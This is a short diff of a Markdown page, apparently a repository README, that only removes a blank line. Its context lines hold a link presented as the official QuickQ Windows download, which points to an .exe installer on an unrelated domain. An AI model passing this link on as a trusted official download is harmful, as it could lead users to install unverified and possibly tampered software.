@@ -4,6 +4,5 @@
 
 [**QuickQ官方电脑版立即下载**](https://www.downloadol.cyou/QUICKQ-Win64-Installer.exe)
 
-
 ![94595489](https://github.com/user-attachments/assets/16833634-4b18-4456-b0c9-ea1649084757)
 
